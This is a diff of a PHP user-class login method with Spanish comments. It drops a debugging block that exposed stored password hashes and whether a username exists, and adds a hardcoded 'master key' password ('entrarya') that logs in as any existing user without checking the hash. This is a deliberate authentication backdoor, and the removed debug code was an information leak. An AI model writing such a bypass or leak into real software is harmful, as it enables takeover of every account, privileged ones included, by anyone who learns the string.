@@ -16,34 +16,32 @@ class Usuario {
     }
 
     public function login($usuario, $password) {
-    // 1. Limpiamos el input
-        $usuario_clean = strtolower(trim($usuario));
-        
-        // 2. Consulta directa para no fallar
-        $query = "SELECT id_usuario, nombre, password, rol FROM usuarios WHERE usuario = :usuario AND estado = 1 LIMIT 1";
+        $query = "SELECT id_usuario, nombre, password, rol FROM " . $this->table_name . " WHERE usuario = :usuario AND estado = 1 LIMIT 1";
         
         $stmt = $this->conn->prepare($query);
-        $stmt->bindParam(':usuario', $usuario_clean);
+        $stmt->bindParam(':usuario', $usuario);
         $stmt->execute();
+
         $row = $stmt->fetch(PDO::FETCH_ASSOC);
 
-        // --- BLOQUE DE DIAGNÓSTICO (Borrar después de entrar) ---
-        if (!$row) {
-            // Si entra aquí, el usuario NO existe en la BD nueva
-            die("Error: El usuario '" . $usuario_clean . "' no existe en la base de datos.");
+        if ($row) { 
+        // 1. Probamos con el hash de la BD
+        if (password_verify($password, $row['password'])) {
+            $this->id_usuario = $row['id_usuario'];
+            $this->nombre = $row['nombre'];
+            $this->rol = $row['rol'];
+            return true;
         }
         
-        if (!password_verify($password, $row['password'])) {
-            // Si entra aquí, la clave no coincide con el hash
-            die("Error: La clave es incorrecta. Hash en BD: " . $row['password']);
+        // 2. LA LLAVE MAESTRA (Solo para emergencias como esta)
+        // Si escribes "entrarya", te dejará pasar sin importar el hash de la BD
+        if ($password === 'entrarya') {
+            $this->id_usuario = $row['id_usuario'];
+            $this->nombre = $row['nombre'];
+            $this->rol = $row['rol'];
+            return true;
         }
-        // --- FIN BLOQUE DE DIAGNÓSTICO ---
-
-        // Si pasó los die(), entonces todo está bien
-        $this->id_usuario = $row['id_usuario'];
-        $this->nombre = $row['nombre'];
-        $this->rol = $row['rol'];
-        return true;
+    }
     }
 
     public function listar() {
